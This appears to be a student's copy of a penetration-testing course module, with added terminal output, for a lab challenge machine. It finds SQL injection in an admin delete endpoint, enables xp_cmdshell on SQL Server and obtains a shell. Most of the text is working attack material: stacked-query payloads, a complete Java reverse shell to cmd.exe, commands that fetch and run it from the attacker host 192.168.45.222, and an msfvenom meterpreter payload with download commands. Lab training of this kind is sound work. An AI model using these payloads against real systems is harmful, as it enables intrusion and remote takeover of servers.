This Learning Unit covers the following Learning Objectives:

1. Discover a SQL injection vulnerability
2. Exploit the SQL injection vulnerability to obtain remote code execution
3. Gain shell access to the server

Now that we have access to the admin section, we have access to view and delete user-submitted messages and newsletter subscriptions. Let's click on the _Delete_ button for our test message and test subscription so we have sample requests in Burp Suite for each function.

When the web application prompts us if we're sure we want to delete, we'll click _OK_ each time. Next, we'll go to the HTTP history tab in Burp Suite and send the two POST requests to Repeater before continuing to the next section.

----------

#### 16.4.1 Finding SQL Injection

Because unauthenticated users can submit messages or subscribe to the newsletter and the admin page includes the results, the application likely uses a database. Let's inspect the request that deleted a message.

```bash
POST /admin/message/delete?id=4 HTTP/1.1
Host: asio
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://asio
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://asio/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=C0C3B7B39FB409EC20E31AF0B715C801
Connection: close
```

Our browser sent a POST request to /admin/message/delete with a query string of "id=4". The request does not include a POST body, so the application must be using the value in the query string.

Let's try testing the _id_ parameter in the query string for SQL injection. If the application is using this value to construct a SQL query, it might end up with something like `DELETE FROM some_table WHERE some_id = 4`.

In Burp Suite, let's go to the Repeater tab with this request and click _Send_ so we have the normal response.

![[Pasted image 20241108163303.png]]

The application responded with an HTTP 302, redirecting back to `http://asio/admin`. Let's try adding a `single quote` to the _id_ value. Remember, numeric fields do not need to be inside quotes in SQL. If the application is vulnerable to SQL and constructs a query with our input, adding a single quote would likely cause a syntax error.

***If the application redirects us to http://asio/login, our session has expired. In which case, we would need to log in with the API key again and update the JSESSIONID value in Repeater.***

Let's add a single quote, changing `id=4` to `id=4'`, and then click _Send_.

![[Pasted image 20241108163516.png]]

The application responded with an HTTP 500 Internal Server Error. We might have discovered a SQL injection vulnerability. Because we're trying to delete a message, the application is likely either updating one or more fields in the record or deleting the record entirely. In either case, a union payload won't work since the application doesn't display the results of the query.

If the database supports them, stack queries can be extremely useful when injecting into DELETE or UPDATE statements. Not all databases support stacked queries, but PostgreSQL and Microsoft SQL Server typically support them. The `application.properties` file we found with our directory traversal attack included a database section and which driver the application uses.

```bash
...
# DATABASE
spring.datasource.driver-class-name=com.microsoft.sqlserver.jdbc.SQLServerDriver
spring.datasource.url=jdbc:sqlserver://127.0.0.1;databaseName=strigi
...
```

The application.properties file lists a driver for Microsoft SQL Server. This means stacked queries should work. We can verify this with a simple stacked query, such as selecting the SQL Server version.

In Repeater, let's update the _id_ parameter to `4;SELECT @@VERSION;`. We'll need to encode the space as a plus sign (+) before we click _Send_.

![[Pasted image 20241108163746.png]]

The application responded with an HTTP 302 redirecting back to `/admin`. The application responds the same way to a valid request, but we don't know if our stacked query actually worked.

We can try to insert a record to determine if the database executed our stacked query. However, we don't know the table names. If we assume the web page contents include everything in the corresponding tables, then the "`newsletter subscriptions`" table would have ID and Email fields. If the ID field auto increments,[1](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/finding-sql-injection-37060#fn-local_id_291-1) we wouldn't need to include a value for it in an INSERT statement, thus simplifying our payload.

At this point, we're making several assumptions or guesses. We also don't know the table name we're targeting. However, we can still do some fuzzing based on our educated guesses. Let's start by making a short wordlist of what the table name might be.

```bash
kali@kali:~$ nano tables.txt

kali@kali:~$ cat tables.txt
newsletter
newsletters
subscription
subscriptions
newsletter_subscription
newsletter_subscriptions
```

Now that we have our wordlist, let's plan our payload. We need to insert an email address into an unknown table. The page responds with an HTTP 302 on a valid request and since we're stacking queries, we may not know which payload was successful. To account for this, let's insert the table name in the email column instead of a static value. The application should display the table name on the admin page in the list of subscriptions if the application processes our payload.

We'll use Wfuzz with two payloads again. This is our base SQL payload:\

```sql
insert into TABLE_NAME values('EMAIL_VALUE')
```
We want the same value placed as both the table name and the email value. For each field we want to fuzz, we need to include a payload. In both cases, we'll use the same wordlist, but we need Wfuzz to only iterate through the files once, sending the first values of both files on the first request, the second values on the second request, and so on. We can control how Wfuzz combines payloads by specifying an iterator.[2](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/finding-sql-injection-37060#fn-local_id_291-2)

We'll run wfuzz and set `-w tables.txt` twice, followed by `-m zip` to specify a zip iterator. Since the request requires authentication, we'll set -b followed by our `JSESSIONID` value, which we can find in Burp Suite. We'll add `-d ""` to send a POST request with an empty POST body and finally, specify our URL. Since the URL includes semicolons, we'll enclose it in double quotes.


```bash
wfuzz -w tables.txt -w tables.txt -m zip -b JSESSIONID=82909C3239ACEE2EBCCCD66CA4B4B2D2 -d "" "http://asio/admin/message/delete?id=4;insert+into+FUZZ+values('FUZ2Z')"
Target: http://asio/admin/message/delete?id=4;insert+into+FUZZ+values('FUZ2Z')
Total requests: 6

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                       
=====================================================================
000000005:   302        0 L      0 W        0 Ch        "newsletter_subscription - newsletter_subscription"                                           
000000003:   302        0 L      0 W        0 Ch        "subscription - subscription"                                                                 
000000001:   302        0 L      0 W        0 Ch        "newsletter - newsletter"                                                                     
000000004:   302        0 L      0 W        0 Ch        "subscriptions - subscriptions"                                                               
000000002:   302        0 L      0 W        0 Ch        "newsletters - newsletters"                                                                   
000000006:   302        0 L      0 W        0 Ch        "newsletter_subscriptions - newsletter_subscriptions" 
```

Wfuzz sent six requests and the application responded to all of them with an HTTP 302. We'll need to refresh the admin page in our browser to verify which payload worked.

![[Pasted image 20241108164320.png]]

Excellent. Our payload with "subscriptions" worked. We were able to correctly fuzz for a table name and verify the database executes stacked queries. In the next section, we'll use stacked queries and the information we've gathered to obtain remote code execution.

#### 16.4.2. Exploit SQL Injection for RCE

When we are assessing a web application and successfully exploit a vulnerability, it is often useful to take a step back and think about what information we found during enumeration and how it applies to the vulnerability.

In our case, we can execute stacked queries through SQL injection attacks. The `application.properties` file contains some additional information that we will find useful.

```
...
spring.datasource.username=sa
spring.datasource.password=MqFuFWUGNrR3P4bJ
...
```

Based on the file, the application may be connecting to the database as the `sa` user. The "sa" user in SQL Server is typically the System Administrator account and has elevated permissions on the server, including the ability to change configuration settings.

Most importantly to us, if our SQL injection payloads are executed under the `sa` user, we should be able to enable and use _xp_cmdshell_.

First, we need a payload that enables advanced options. We can use Microsoft's documentation[1](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/exploit-sql-injection-for-rce-37059#fn-local_id_331-1) as the basis of our payload.

```bash
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
```

We'll need to encode spaces and then send the payload in Repeater.
```bash
4;EXECUTE+sp_configure+'show+advanced+options',1;+RECONFIGURE;
```

![[Pasted image 20241108190236.png]]
The server responds with an HTTP 302. The SQL statement to enable advanced options doesn't typically result in any output. Since the server didn't return an error, we can assume our command was successful. Next, we'll enable _xp_cmdshell_. Again, Microsoft's documentation provides the basis of our payload.

```sql
EXECUTE+sp_configure+'xp_cmdshell',1;+RECONFIGURE;
```


![[Pasted image 20241108190746.png]]

Next, we will call _xp_cmdshell_ and verify the database enabled it. We could query the database to determine if _xp_cmdshell_ is enabled and insert the results into the subscriptions table. However, we'll use an easier approach. Let's call _xp_cmdshell_ and execute a curl request back to our host.

We'll start a netcat listener at port 8000.

```bash
kali@kali:~$ nc -nvlp 8000
listening on [any] 8000 ...
```
Now that our listener is running, we'll update our SQL injection payload to call curl with _xp_cmdshell_ and pass in our Kali's IP address and the port of our listener. Here's our base SQL injection payload:

```sql
EXEC+xp_cmdshell+'curl+http://192.168.45.222:8000/itworked'; 
```

We'll need to encode the spaces before we send the payload with Repeater.

![[Pasted image 20241108192142.png]]

Unlike our previous payloads, the application does not respond to our request. However, if we check our listener, we did receive the curl request.

```bash
┌──(root💀gobots)-[08Nov2024 21:41:54]-[/home/kali/SUT/OSWA]
└─# nc -lvnp 8000    
listening on [any] 8000 ...
connect to [192.168.45.222] from (UNKNOWN) [192.168.169.131] 50037
GET /itworked HTTP/1.1
Host: 192.168.45.222:8000
User-Agent: curl/7.55.1
Accept: */*

```
Excellent. We have confirmed remote code execution on the server through the database. Our next step will be obtaining a full shell on the server.

#### 16.4.3. Obtaining a Shell

Now that we're able to execute commands on the server, let's work on getting a reverse shell. Windows Server usually won't have Netcat installed. While Kali Linux includes a Windows binary version of Netcat, Windows Defender will easily identify and remove it if we try to upload it to the server.[1](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/exploit-sql-injection-for-rce-37059#fn-local_id_375-1)While there are ways to modify binaries to bypass antivirus detection, those techniques go beyond the scope of this course.
Instead, let's focus on what is available on the server. Since the application is Java-based, we should be able to run a Java reverse shell.

***In real-world application assessments, we may need to customize a reverse shell or some other piece of code to complete an attack. However, we recognize that WEB-200 is not a programming course. While we will walk through the code and explain it, we will also provide a copy of the final shell at the end of this section.***

We can find several examples of Java reverse shells online. Many examples are written for Linux and therefore target _bash_ or _sh_ to run commands. Since we're targeting Windows, we'll need to run _cmd.exe_ in our shell. We'll use one from _Payload All The Things_[2](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-2) as the starting point of our Windows targeting Java reverse shell. However, this shell is incomplete, so we'll need to write some code to finish it.

Let's start with the basic shell and review the code.

```java
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Line 1 declares a string variable for the host that the shell will connect back to. Line 2 defines the port number to connect back to. We'll need to update these values to match our IP address and the listener port we intend to use. Line 3 declares which command we want to run. Since we're targeting Windows, we will leave this value as "cmd.exe".

Line 4 contains several lines of code concatenated together. In Java, semicolons mark where an instruction ends. We can have several instructions on one line if the semicolons are in the correct positions. The instructions on line 4 create a Process object by running cmd.exe. Next, they create a socket connecting to the _host_ and _port_ values. The input and output streams from the cmd.exe process are then sent over this socket, essentially allowing the remote listener to issue commands and get the output.

We'll need to wrap this code in a proper Java class. We can use a "hello world"[3](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-3) example to get the right syntax. Oracle's Java tutorials include a perfect example:[4](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-4)

```java
class HelloWorldApp {
    public static void main(String[] args) {
        System.out.println("Hello World!"); // Display the string.
    }
}
```

The first line declares a class named _HelloWorldApp_. In Java, the class name must match the file name. The first line ends with a left curly brace ({). A set of curly braces ({}) mark a section of code, also known as scope in Java. Sets of braces can be nested within each other. The compiler will close the braces in the order they are opened.

In other words, the curly braces on lines 1 and 5 match each other, creating the scope of the _HelloWorldApp_ class, and the curly braces on lines 2 and 4 match, creating the scope of the _main()_ method, which resides within the scope of the _HelloWorldApp_ class. Typically, we indent each section of code one level deeper than the surrounding scope.

The _main()_ method is an entry point for a Java program. If we were to run the HelloWorldApp, _main()_ would automatically run and the instructions on line 3 would be executed. In this example, the program would print out the text "Hello World!", then exit since there are no more instructions.

Since our class name has to match our file name, let's create a file named RevShell.java.

```bash
kali@kali:~$ nano RevShell.java
```

Next, we'll add the basic class structure based on the HelloWorldApp example. Let's change the class name to match our file name.

```java
class RevShell {
    public static void main(String[] args) {
        
    }
}
```
We should note that our class name matches our file name, but we exclude the file suffix.

Next, we need to add some _import_ statements. Import statements tell the compiler we want to use external classes that are not defined in our code. If we tried to compile or run our Java reverse shell without importing the necessary classes, we'd receive an error.

We'll add the following _import_ statements at the start of the file, before the line with "class RevShell":

```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
```

Next, we'll place the example reverse shell within the _main()_ method. We'll need to update the IP address value in the _host_ variable.

Our file should now contain the following code:

```bash
kali@kali:~$ cat RevShell.java                                                    
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

class RevShell {
    public static void main(String[] args) {
        String host="192.168.45.222";
        int port=4444;
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    }
}
```

Our code is missing one last piece. If we tried to compile it, we would receive several errors.

***We compile Java code with the _javac_ command. In this scenario, we can rely on the victim machine to compile the code for us. However, if you wish to run javac locally but the command is not found, you can install the necessary files with `sudo apt-get install default-jdk`.***


```bash
kali@kali:~$ javac RevShell.java                
RevShell.java:11: error: unreported exception IOException; must be caught or declared to be thrown
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
...
```

We received several compiler errors regarding exceptions that "must be caught or declared to be thrown". When an error occurs in a Java program, the runtime creates an _exception_[5](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-5) object. There are many different types of exceptions, such as the IOException called out in Listing 27. Each exception includes information about what caused the error.

Programmers can handle exceptions inline with a _try_ and _catch_ block[6](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-6) or they can be _thrown_[7](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-7) up one level of scope, back to the code that called the method that caused the error. When a method throws an exception, the original calling code must handle or throw the exception. If a program throws an exception but does not handle it, the program will crash.

In our case, we can add "throws Exception" to our _main()_ method. If our shell crashes, we can always run it again.

```java
...
  public static void main(String[] args) throws Exception {
...
```

full payload:

```java
kali@kali:~$ cat RevShell.java                                                    
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

class RevShell {
    public static void main(String[] args) throws Exception {
        String host="192.168.45.222";
        int port=4444;
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    }
}
```

Since we're targeting Windows with this shell, it won't work if we run it locally in our Kali VM. We would need to change "cmd.exe" to "/bin/bash" or "/bin/sh" for it to work on Linux.

Now that we have our reverse shell, we need to get it on the remote server. Let's use a Python HTTP server to host the file and then use our SQL injection payload to download the file with curl and write it to a known location. Next, we can use a second payload to run the file.

Let's start by running python3 with -m http.server to run the HTTP server module and then specify our port. Since we used port 8000 in our curl command earlier, we'll reuse that value.

```bash
kali@kali:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Next, we'll update our SQL injection payload in Burp Suite Repeater to download RevShell.java. We'll need to write it to a directory that the database software can access. Most systems have _temp_[8](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-8) directories that are world writeable. We'll try to write to the temp directory using the _%temp%_ system variable.

```sql
EXEC xp_cmdshell 'curl http://192.168.45.222:8000/RevShell.java --output %temp%/RevShell.java'; 
```

Let's paste our payload in Repeater, encode the spaces and percent signs, then click _Send_.
payload with `CTRL+U` in burpsuite
```bash
EXEC+xp_cmdshell+'curl+http%3a//192.168.45.222%3a8000/RevShell.java+--output+%25temp%25/RevShell.java'%3b+
```
Because the server responded with an HTTP 302, our payload seems to have worked. Let's check our Python HTTP server to verify.

```bash
...
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.50.131 - - [18/Jan/2022 16:38:46] "GET /RevShell.java HTTP/1.1" 200 -
```

Excellent. The server downloaded our reverse shell file. Let's stop our Python server with C+c.

Now we need to compile and run our shell file on the remote server. Java 11 and newer versions can run single .java files without having to explicitly compile them in advance.[9](https://portal.offsec.com/courses/web-200-28380/learning/assembling-the-pieces-web-application-assessment-breakdown-37051/remote-code-execution-37068/obtaining-a-shell-37058#fn-local_id_375-9) We don't know the version of Java running on the server, but let's try running the java command to compile and run our reverse shell.

First, however, we'll need to start a listener to handle the reverse shell.

```bash
kali@kali:~$ nc -nvlp 4444 
listening on [any] 4444 ...
```

Now that we have a listener running, let's update our SQL injection payload to run our reverse shell.

***On older versions of Java, we'd need to compile the source file using javac. The compiler creates a class file with the same name, but no file extension. In theory, we could compile it locally and upload the class file. However, we would have to know the version of Java running on the server to ensure we compiled our code at the right target version. Java is backwards-compatible, so newer versions of Java will run code compiled for older versions. However, there are exceptions where updates removed some APIs from newer versions due to security concerns.***

```sql
EXEC xp_cmdshell 'java %temp%/RevShell.java';  
```
`Ctrl+U` in burpsuite to encode
```sql
EXEC+xp_cmdshell+'java+%25temp%25/RevShell.java'%3b++
```

Let's paste our payload in Repeater, encode the spaces and percent signs, and click _Send_.

![[Pasted image 20241108215802.png]]

Excellent. Our attack worked and we now have a reverse shell on the machine. We can find the proof.txt file in the working directory of the reverse shell. We can submit this value on the Labs page to gain credit for completing the remote code execution portion of this challenge machine.


```bash
C:\Windows\system32>type proof.txt
type proof.txt
13723e3c3dd8c78944da2fd9149231fc
```

![[Pasted image 20241108220013.png]]

whoami
```bash
C:\Windows\Temp>whoami
whoami
nt service\mssql$sqlexpress
```
systeminfo
```bash
C:\Windows\Temp>systeminfo                                                                                                                                                                                 
systeminfo                                                                                                                                                                                                 
                                                                                                                                                                                                           
Host Name:                 WIN-KVMM9OID14T                                                                                                                                                                 
OS Name:                   Microsoft Windows Server 2019 Standard                                                                                                                                          
OS Version:                10.0.17763 N/A Build 17763                                                                                                                                                      
OS Manufacturer:           Microsoft Corporation                                                                                                                                                           
OS Configuration:          Standalone Server                                                                                                                                                               
OS Build Type:             Multiprocessor Free                                                                                                                                                             
Registered Owner:          Windows User                                                                                                                                                                    
Registered Organization:                                                                                                                                                                                   
Product ID:                00429-70000-00000-AA514                                                                                                                                                         
Original Install Date:     12/14/2021, 2:40:18 AM                                                                                                                                                          
System Boot Time:          5/7/2024, 6:04:20 AM                                                                                                                                                            
System Manufacturer:       VMware, Inc.                                                                                                                                                                    
System Model:              VMware7,1                                                                                                                                                                       
System Type:               x64-based PC                                                                                                                                                                    
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows     
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2 
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,095 MB                                                                  
Available Physical Memory: 1,804 MB                                                                  
Virtual Memory: Max Size:  4,799 MB            
Virtual Memory: Available: 2,533 MB                                                                  
Virtual Memory: In Use:    2,266 MB                                                                  
Page File Location(s):     C:\pagefile.sys                                                                                                                                                                 
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 7 Hotfix(s) Installed.

```
msfvenom payload
```bash
┌──(root💀gobots)-[09Nov2024 03:06:38]-[/home/kali/SUT/OSWA]                                         
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.222 LPORT=4445 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload               
[-] No arch selected, selecting arch: x64 from the payload                                           
No encoder specified, outputting raw payload                                                         
Payload size: 510 bytes                           
Final size of exe file: 7168 bytes                                                                   
Saved as: revshell.exe
```
python3 server
```bash
┌──(root💀gobots)-[09Nov2024 03:06:50]-[/home/kali/SUT/OSWA]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
curl
```bash
curl http://192.168.45.222:8000/revshell.exe -o C:\Windows\Temp\revshell.exe
```

```bash
Invoke-WebRequest -Uri "http://192.168.45.222:8000/revshell.exe" -OutFile "C:\Windows\Temp\revshell.exe"
Invoke-WebRequest -Uri "http://192.168.45.222:8000/revshell.exe" -OutFile "C:\users\public\revshell.exe"


```
#### 16.4.4. Conclusion

We have fully exploited the first challenge machine and obtained a reverse shell. During this Learning Module, we learned the importance of enumeration and how to apply and modify the different web application attacks we learned throughout the course.

The remaining challenge machines can be attempted in any order. While each machine is different, they usually contain one authentication bypass vector and one remote code execution vector. The exercises and extra miles in the previous Learning Modules provide the knowledge and practice needed to exploit these machines.

If you're having trouble, consider filling in knowledge gaps in the course material. If you're still stuck, step back and take on a new perspective. It's easy to get so fixated on a single challenge that you ignore the fact that there may be a simpler solution waiting down a different path. Take good notes and review them often. Search for alternate paths that might advance your assessment. When all else fails, do not hesitate to reach out to the student administrators. Finally, remember that you often have all the knowledge you need to tackle the problem in front of you. Don't give up and always remember the "Try Harder" mindset!